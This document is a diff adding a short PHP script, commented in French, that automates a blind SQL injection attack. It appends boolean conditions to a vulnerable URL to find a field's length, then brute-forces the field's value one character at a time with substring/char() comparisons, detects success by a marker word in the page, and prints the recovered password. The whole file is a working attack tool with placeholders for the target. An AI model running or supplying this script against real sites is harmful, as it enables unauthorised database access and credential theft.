@@ -1,0 +1,56 @@
+<?php
+
+set_time_limit(0); // enlever la limite d'exec di script
+
+$url="url_ici"; // l'url vuln
+
+/* Récupération de la longueur du champ */
+
+$max = 50; // valeur max acceptée 
+$longueur = 0;
+echo " Détection de la longueur du champ à bruteforcer...<br />";
+for($i = 1; $i<$max; $i++){
+   $fp = fopen($url . urlencode(" and length(champ_ici)=$i"),"r");
+   $buf = "";
+   while(!feof($fp))
+   {
+      $buf .= fgets($fp);	
+   }
+   //Si on trouve le mot "mot_ici" sur la page, donc c correcte
+   if(preg_match("/mot_ici/",$buf)) {
+      echo " La longueur du champ à bruteforcer vaut : $i <br />";
+      $longueur = $i;
+      break;
+   }
+
+}
+if($longueur == 0) die("Erreur : la longueur du champ n'a pas pu être récupérer");
+
+/* Bruteforce de la valeur du champ */ 
+
+$pass = "";
+$i = 1;
+//Intervalle des caractères ascii
+$borne_inf = 48;
+$borne_sup = 123;
+
+$code = $borne_inf;
+while($i <= $longueur){
+
+   if($code == $borne_sup + 1) $code = $borne_inf;
+   $fp = fopen($url.urlencode(" and substring(champ_ici,$i,1)=char($code)"),"r");
+   $ligne = "";
+   
+   while(!feof($fp))
+   {
+      $ligne .= fgets($fp);	
+   }
+   if(preg_match("/mot_ici/",$ligne)) {
+      $pass .= chr($code);
+      $i++;
+      $code = $borne_inf;
+   }
+   $code++;
+}
+echo "Pass final : $pass <br />";
+?>
